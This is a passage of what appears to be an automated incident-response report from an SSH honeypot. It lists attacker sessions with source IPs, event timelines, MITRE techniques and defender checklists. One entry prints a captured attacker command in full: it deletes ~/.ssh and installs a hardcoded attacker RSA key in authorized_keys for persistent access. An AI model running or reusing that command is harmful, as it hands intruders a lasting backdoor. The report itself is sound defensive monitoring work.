|---|---|
| `2026-07-15 21:17:07` | `cowrie.session.connect` |
| `2026-07-15 21:17:08` | `cowrie.client.version` |
| `2026-07-15 21:17:09` | `cowrie.client.kex` |
| `2026-07-15 21:17:10` | `cowrie.login.success` |
| `2026-07-15 21:17:11` | `cowrie.direct-tcpip.request` |
| `2026-07-15 21:17:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.70.23[.]253` to AbuseIPDB if not already reported
- [ ] Block `111.70.23[.]253` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c03b07a9c9c5

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]137` |
| **First Seen** | 2026-07-15 21:21 |
| **Last Seen** | 2026-07-15 21:21 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 21:21:36` | `cowrie.session.connect` |
| `2026-07-15 21:21:36` | `cowrie.client.version` |
| `2026-07-15 21:21:36` | `cowrie.client.kex` |
| `2026-07-15 21:21:36` | `cowrie.login.success` |
| `2026-07-15 21:21:37` | `cowrie.direct-tcpip.request` |
| `2026-07-15 21:21:37` | `cowrie.direct-tcpip.ja4` |
| `2026-07-15 21:21:37` | `cowrie.direct-tcpip.data` |
| `2026-07-15 21:21:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]137` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]137` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2b0fe2a96a71

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]137` |
| **First Seen** | 2026-07-15 21:24 |
| **Last Seen** | 2026-07-15 21:24 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 21:24:04` | `cowrie.session.connect` |
| `2026-07-15 21:24:04` | `cowrie.client.version` |
| `2026-07-15 21:24:04` | `cowrie.client.kex` |
| `2026-07-15 21:24:04` | `cowrie.login.success` |
| `2026-07-15 21:24:05` | `cowrie.direct-tcpip.request` |
| `2026-07-15 21:24:05` | `cowrie.direct-tcpip.ja4` |
| `2026-07-15 21:24:05` | `cowrie.direct-tcpip.data` |
| `2026-07-15 21:24:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]137` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]137` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-877c12722743

| Field | Detail |
|---|---|
| **Source IP** | `182.79.218[.]101` |
| **First Seen** | 2026-07-15 21:26 |
| **Last Seen** | 2026-07-15 21:27 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 21:26:53` | `cowrie.session.connect` |
| `2026-07-15 21:26:53` | `cowrie.client.version` |
| `2026-07-15 21:26:53` | `cowrie.client.kex` |
| `2026-07-15 21:26:55` | `cowrie.login.success` |
| `2026-07-15 21:26:56` | `cowrie.direct-tcpip.request` |
| `2026-07-15 21:27:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.79.218[.]101` to AbuseIPDB if not already reported
- [ ] Block `182.79.218[.]101` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b02ddb27ae7a

| Field | Detail |
|---|---|
| **Source IP** | `101.96.230[.]94` |
| **First Seen** | 2026-07-15 21:27 |
| **Last Seen** | 2026-07-15 21:27 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 21:27:14` | `cowrie.session.connect` |
| `2026-07-15 21:27:14` | `cowrie.client.version` |
| `2026-07-15 21:27:14` | `cowrie.client.kex` |
| `2026-07-15 21:27:15` | `cowrie.login.success` |
| `2026-07-15 21:27:16` | `cowrie.session.params` |
| `2026-07-15 21:27:16` | `cowrie.command.input` |
| `2026-07-15 21:27:16` | `cowrie.command.failed` |
| `2026-07-15 21:27:17` | `cowrie.log.closed` |
| `2026-07-15 21:27:17` | `cowrie.session.params` |
| `2026-07-15 21:27:17` | `cowrie.command.input` |
| `2026-07-15 21:27:18` | `cowrie.session.file_download` |
| `2026-07-15 21:27:18` | `cowrie.log.closed` |
| `2026-07-15 21:27:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.96.230[.]94` to AbuseIPDB if not already reported
- [ ] Block `101.96.230[.]94` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0e59505b8a57

| Field | Detail |
|---|---|
| **Source IP** | `101.96.230[.]94` |
| **First Seen** | 2026-07-15 21:27 |
| **Last Seen** | 2026-07-15 21:27 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 21:27:18` | `cowrie.session.connect` |
| `2026-07-15 21:27:18` | `cowrie.client.version` |
| `2026-07-15 21:27:18` | `cowrie.client.kex` |
| `2026-07-15 21:27:19` | `cowrie.login.success` |
| `2026-07-15 21:27:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.96.230[.]94` to AbuseIPDB if not already reported
- [ ] Block `101.96.230[.]94` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f248bd3de0b2

| Field | Detail |
|---|---|
| **Source IP** | `101.96.230[.]94` |
| **First Seen** | 2026-07-15 21:27 |
| **Last Seen** | 2026-07-15 21:27 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 21:27:20` | `cowrie.session.connect` |
| `2026-07-15 21:27:20` | `cowrie.client.version` |
| `2026-07-15 21:27:20` | `cowrie.client.kex` |
| `2026-07-15 21:27:21` | `cowrie.login.success` |
| `2026-07-15 21:27:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.96.230[.]94` to AbuseIPDB if not already reported
- [ ] Block `101.96.230[.]94` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e945be2fb0c7

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-15 21:27 |
| **Last Seen** | 2026-07-15 21:27 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 21:27:23` | `cowrie.session.connect` |
| `2026-07-15 21:27:23` | `cowrie.client.version` |
| `2026-07-15 21:27:24` | `cowrie.client.kex` |
| `2026-07-15 21:27:24` | `cowrie.login.success` |
| `2026-07-15 21:27:24` | `cowrie.direct-tcpip.request` |
| `2026-07-15 21:27:24` | `cowrie.direct-tcpip.data` |
| `2026-07-15 21:27:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3d1c51ba4871

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-15 21:31 |
| **Last Seen** | 2026-07-15 21:31 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 21:31:05` | `cowrie.session.connect` |
| `2026-07-15 21:31:05` | `cowrie.client.version` |
| `2026-07-15 21:31:05` | `cowrie.client.kex` |
| `2026-07-15 21:31:05` | `cowrie.login.success` |
| `2026-07-15 21:31:06` | `cowrie.session.params` |
| `2026-07-15 21:31:06` | `cowrie.command.input` |
| `2026-07-15 21:31:06` | `cowrie.log.closed` |
| `2026-07-15 21:31:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7de5dec4a321

| Field | Detail |
|---|---|
| **Source IP** | `103.103.53[.]44` |
| **First Seen** | 2026-07-15 21:37 |
| **Last Seen** | 2026-07-15 21:37 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 21:37:49` | `cowrie.session.connect` |
| `2026-07-15 21:37:50` | `cowrie.client.version` |
| `2026-07-15 21:37:50` | `cowrie.client.kex` |
| `2026-07-15 21:37:53` | `cowrie.login.success` |
| `2026-07-15 21:37:54` | `cowrie.direct-tcpip.request` |
| `2026-07-15 21:37:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.103.53[.]44` to AbuseIPDB if not already reported
- [ ] Block `103.103.53[.]44` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3fb1d5618add

| Field | Detail |
|---|---|
| **Source IP** | `59.120.8[.]61` |
| **First Seen** | 2026-07-15 21:41 |
| **Last Seen** | 2026-07-15 21:41 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 21:41:12` | `cowrie.session.connect` |
| `2026-07-15 21:41:13` | `cowrie.client.version` |
| `2026-07-15 21:41:13` | `cowrie.client.kex` |
| `2026-07-15 21:41:15` | `cowrie.login.success` |
| `2026-07-15 21:41:15` | `cowrie.direct-tcpip.request` |
| `2026-07-15 21:41:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `59.120.8[.]61` to AbuseIPDB if not already reported
- [ ] Block `59.120.8[.]61` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1ebb315723af

| Field | Detail |
|---|---|
| **Source IP** | `62.201.228[.]210` |
| **First Seen** | 2026-07-15 21:41 |
| **Last Seen** | 2026-07-15 21:42 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 21:41:58` | `cowrie.session.connect` |
| `2026-07-15 21:41:59` | `cowrie.client.version` |
| `2026-07-15 21:41:59` | `cowrie.client.kex` |
| `2026-07-15 21:42:00` | `cowrie.login.success` |
| `2026-07-15 21:42:00` | `cowrie.direct-tcpip.request` |
| `2026-07-15 21:42:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `62.201.228[.]210` to AbuseIPDB if not already reported
- [ ] Block `62.201.228[.]210` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a5bae1936c03

| Field | Detail |
|---|---|
| **Source IP** | `101.13.1[.]58` |
| **First Seen** | 2026-07-15 21:45 |
| **Last Seen** | 2026-07-15 21:45 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 21:45:27` | `cowrie.session.connect` |
| `2026-07-15 21:45:28` | `cowrie.client.version` |
| `2026-07-15 21:45:28` | `cowrie.client.kex` |
| `2026-07-15 21:45:30` | `cowrie.login.success` |
| `2026-07-15 21:45:31` | `cowrie.direct-tcpip.request` |
| `2026-07-15 21:45:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.13.1[.]58` to AbuseIPDB if not already reported
- [ ] Block `101.13.1[.]58` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-97f2f299a294

| Field | Detail |
|---|---|
| **Source IP** | `210.13.99[.]66` |
| **First Seen** | 2026-07-15 21:45 |
| **Last Seen** | 2026-07-15 21:45 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 21:45:41` | `cowrie.session.connect` |
| `2026-07-15 21:45:42` | `cowrie.client.version` |
| `2026-07-15 21:45:42` | `cowrie.client.kex` |
| `2026-07-15 21:45:44` | `cowrie.login.success` |
| `2026-07-15 21:45:45` | `cowrie.direct-tcpip.request` |
| `2026-07-15 21:45:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `210.13.99[.]66` to AbuseIPDB if not already reported
- [ ] Block `210.13.99[.]66` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c2bb1f5e0db3

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-15 21:48 |
| **Last Seen** | 2026-07-15 21:48 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 21:48:09` | `cowrie.session.connect` |
| `2026-07-15 21:48:09` | `cowrie.client.version` |
| `2026-07-15 21:48:09` | `cowrie.client.kex` |
| `2026-07-15 21:48:09` | `cowrie.login.success` |
| `2026-07-15 21:48:10` | `cowrie.session.params` |
| `2026-07-15 21:48:10` | `cowrie.command.input` |
| `2026-07-15 21:48:11` | `cowrie.log.closed` |
| `2026-07-15 21:48:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-be733fab1c43

| Field | Detail |
|---|---|
| **Source IP** | `103.61.122[.]229` |
| **First Seen** | 2026-07-15 21:58 |
| **Last Seen** | 2026-07-15 21:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 21:58:55` | `cowrie.session.connect` |
| `2026-07-15 21:58:55` | `cowrie.client.version` |
| `2026-07-15 21:58:55` | `cowrie.client.kex` |
| `2026-07-15 21:58:56` | `cowrie.login.success` |
| `2026-07-15 21:58:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.61.122[.]229` to AbuseIPDB if not already reported
- [ ] Block `103.61.122[.]229` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5a111b2a6f9f

| Field | Detail |
|---|---|
| **Source IP** | `207.254.71[.]129` |
| **First Seen** | 2026-07-15 22:06 |
| **Last Seen** | 2026-07-15 22:07 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 22:06:58` | `cowrie.session.connect` |
| `2026-07-15 22:06:59` | `cowrie.client.version` |
| `2026-07-15 22:06:59` | `cowrie.client.kex` |
| `2026-07-15 22:06:59` | `cowrie.login.success` |
| `2026-07-15 22:07:00` | `cowrie.direct-tcpip.request` |
| `2026-07-15 22:07:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `207.254.71[.]129` to AbuseIPDB if not already reported
- [ ] Block `207.254.71[.]129` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-089e2b1ed1b9

| Field | Detail |
|---|---|
| **Source IP** | `202.138.229[.]190` |
| **First Seen** | 2026-07-15 22:07 |
| **Last Seen** | 2026-07-15 22:07 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 22:07:05` | `cowrie.session.connect` |
| `2026-07-15 22:07:07` | `cowrie.client.version` |
| `2026-07-15 22:07:07` | `cowrie.client.kex` |
| `2026-07-15 22:07:09` | `cowrie.login.success` |
| `2026-07-15 22:07:10` | `cowrie.direct-tcpip.request` |
| `2026-07-15 22:07:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `202.138.229[.]190` to AbuseIPDB if not already reported
- [ ] Block `202.138.229[.]190` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8ad36267cebd

| Field | Detail |
|---|---|
| **Source IP** | `46.101.9[.]55` |
| **First Seen** | 2026-07-15 22:13 |
| **Last Seen** | 2026-07-15 22:13 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 22:13:49` | `cowrie.session.connect` |
| `2026-07-15 22:13:50` | `cowrie.client.version` |
| `2026-07-15 22:13:50` | `cowrie.client.kex` |
| `2026-07-15 22:13:50` | `cowrie.login.success` |
| `2026-07-15 22:13:51` | `cowrie.direct-tcpip.request` |
| `2026-07-15 22:13:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `46.101.9[.]55` to AbuseIPDB if not already reported
- [ ] Block `46.101.9[.]55` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-76577b6c94da

| Field | Detail |
|---|---|
| **Source IP** | `196.188.187[.]205` |
| **First Seen** | 2026-07-15 22:13 |
| **Last Seen** | 2026-07-15 22:14 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 22:13:56` | `cowrie.session.connect` |
| `2026-07-15 22:13:56` | `cowrie.client.version` |
| `2026-07-15 22:13:56` | `cowrie.client.kex` |
| `2026-07-15 22:13:58` | `cowrie.login.success` |
| `2026-07-15 22:13:59` | `cowrie.direct-tcpip.request` |
| `2026-07-15 22:14:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.188.187[.]205` to AbuseIPDB if not already reported
- [ ] Block `196.188.187[.]205` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-600aaf5594bc

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-15 22:23 |
| **Last Seen** | 2026-07-15 22:23 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 22:23:27` | `cowrie.session.connect` |
| `2026-07-15 22:23:27` | `cowrie.client.version` |
| `2026-07-15 22:23:27` | `cowrie.client.kex` |
| `2026-07-15 22:23:27` | `cowrie.login.success` |
| `2026-07-15 22:23:27` | `cowrie.direct-tcpip.request` |
| `2026-07-15 22:23:27` | `cowrie.direct-tcpip.data` |
| `2026-07-15 22:23:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c3f7c4f9bfc2

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-15 22:23 |
| **Last Seen** | 2026-07-15 22:23 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 22:23:56` | `cowrie.session.connect` |
| `2026-07-15 22:23:57` | `cowrie.client.version` |
| `2026-07-15 22:23:57` | `cowrie.client.kex` |
| `2026-07-15 22:23:58` | `cowrie.login.success` |
| `2026-07-15 22:23:59` | `cowrie.session.params` |
| `2026-07-15 22:23:59` | `cowrie.command.input` |
| `2026-07-15 22:23:59` | `cowrie.log.closed` |
| `2026-07-15 22:23:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f858edc57c14

| Field | Detail |
|---|---|
| **Source IP** | `154.177.200[.]220` |
| **First Seen** | 2026-07-15 22:31 |
| **Last Seen** | 2026-07-15 22:31 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 22:31:04` | `cowrie.session.connect` |
| `2026-07-15 22:31:05` | `cowrie.client.version` |
| `2026-07-15 22:31:05` | `cowrie.client.kex` |
| `2026-07-15 22:31:06` | `cowrie.login.success` |
| `2026-07-15 22:31:06` | `cowrie.direct-tcpip.request` |
| `2026-07-15 22:31:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.177.200[.]220` to AbuseIPDB if not already reported
- [ ] Block `154.177.200[.]220` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5e2d16c90fa0

| Field | Detail |
|---|---|
| **Source IP** | `120.234.232[.]184` |
| **First Seen** | 2026-07-15 22:35 |
| **Last Seen** | 2026-07-15 22:35 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 22:35:07` | `cowrie.session.connect` |
| `2026-07-15 22:35:07` | `cowrie.client.version` |
| `2026-07-15 22:35:07` | `cowrie.client.kex` |
| `2026-07-15 22:35:09` | `cowrie.login.success` |
| `2026-07-15 22:35:10` | `cowrie.direct-tcpip.request` |
| `2026-07-15 22:35:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.234.232[.]184` to AbuseIPDB if not already reported
- [ ] Block `120.234.232[.]184` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-37f204ee08db

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-15 22:40 |
| **Last Seen** | 2026-07-15 22:40 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 22:40:55` | `cowrie.session.connect` |
| `2026-07-15 22:40:55` | `cowrie.client.version` |
| `2026-07-15 22:40:56` | `cowrie.client.kex` |
| `2026-07-15 22:40:56` | `cowrie.login.success` |
| `2026-07-15 22:40:57` | `cowrie.session.params` |
| `2026-07-15 22:40:57` | `cowrie.command.input` |
| `2026-07-15 22:40:57` | `cowrie.log.closed` |
| `2026-07-15 22:40:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-84128f849885

| Field | Detail |
|---|---|
| **Source IP** | `92.62.74[.]41` |
| **First Seen** | 2026-07-15 22:42 |
